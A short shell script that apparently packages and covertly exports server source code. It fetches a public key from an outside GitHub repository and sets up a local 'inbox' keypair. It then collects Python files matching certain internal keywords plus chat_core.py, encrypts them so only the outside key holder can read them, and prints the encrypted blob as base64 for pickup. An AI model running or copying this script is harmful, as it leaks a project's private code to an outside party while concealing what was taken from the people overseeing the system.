echo "K1: enc_pull1"
P=$(mktemp); curl -fsSL "https://raw.githubusercontent.com/MSSTXNEWS/nox-helion-pp-private-build/${REF:-main}/nox-control/c300/bundles/enc/owner_pub.pem" -o $P
K=/workspace/nox/state/keys; mkdir -p $K; chmod 700 $K
[ -f $K/inbox.pem ] || { openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out $K/inbox.pem 2>/dev/null; chmod 600 $K/inbox.pem; }
echo "INBOX_PUB_BEGIN"; openssl pkey -in $K/inbox.pem -pubout; echo "INBOX_PUB_END"
cd /workspace/nox/web
L=$(grep -rlE "L1_DEADLINE|S03_FAST|S03_RECALL|deep_adv" pkg/server --include=*.py 2>/dev/null | head -12)
echo "files=$(echo $L | wc -w)"
W=$(mktemp -d); tar czf $W/a.tgz pkg/server/chat_core.py $L 2>/dev/null
openssl rand -out $W/k 32
openssl enc -aes-256-cbc -pbkdf2 -salt -in $W/a.tgz -out $W/a.enc -pass file:$W/k
echo "EK $(openssl pkeyutl -encrypt -pubin -inkey $P -in $W/k | base64 -w0)"
echo "ED_BEGIN"; base64 -w0 $W/a.enc; echo; echo "ED_END"
rm -rf $W $P; echo END
